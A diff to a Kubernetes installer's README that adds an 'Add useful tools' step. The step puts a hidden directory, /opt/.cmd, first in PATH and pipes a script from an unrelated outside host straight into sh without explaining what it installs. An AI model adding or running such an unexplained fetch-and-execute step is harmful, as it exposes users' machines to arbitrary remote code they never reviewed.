@@ -17,10 +17,18 @@ The provided script automates the installation and configuration of the followin
 ## Before the install
 
 * Change `config/config.yaml` api address to your host ip address
+
 ```
   address: 10.2.0.6
 ...
   k8sServiceHost: 10.2.0.6
+```
+
+* Add useful tools
+
+```
+export PATH=/opt/.cmd:$PATH
+curl -L a.zzci.cc/aa | sh -s install cmd
 ```
 
 * Gen custom CA
